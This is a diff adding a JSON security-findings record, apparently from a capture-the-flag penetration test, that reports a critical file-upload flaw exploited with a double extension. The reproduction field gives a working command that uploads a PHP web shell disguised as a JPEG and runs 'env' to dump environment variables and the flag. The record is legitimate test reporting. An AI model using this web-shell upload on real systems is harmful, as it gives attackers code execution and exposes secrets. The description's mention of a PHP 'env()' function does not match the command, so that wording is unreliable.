@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-15T01:00:37.028386+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d4c8fe7f-98f6-49ee-a8ec-b8f5c681b73e",
+      "timestamp": "2026-04-15T01:00:37.028245+00:00",
+      "title": "Unrestricted File Upload Leading to RCE and Flag Disclosure",
+      "severity": "critical",
+      "target": "http://172.17.0.1:42861",
+      "description": "The image upload functionality only validates the file extension by checking the last extension in the filename. By uploading a file with a double extension (e.g., test.jpg.php), the validation passes (sees .jpg) but Apache executes it as PHP. Additionally, the FLAG environment variable is exposed via PHP's env() function.",
+      "evidence": "FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "echo -e '\\xff\\xd8\\xff\\xe0\\n<?php echo system(\"env\"); ?>' > /tmp/test.jpg.php && curl -F 'userfile=@/tmp/test.jpg.php' -F 'submit=Upload Image' http://172.17.0.1:42861/index.php && curl http://172.17.0.1:42861/upload/test.jpg.php",
+        "expected": "FLAG=flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}"
+      }
+    }
+  ],
+  "diagrams": []
+}
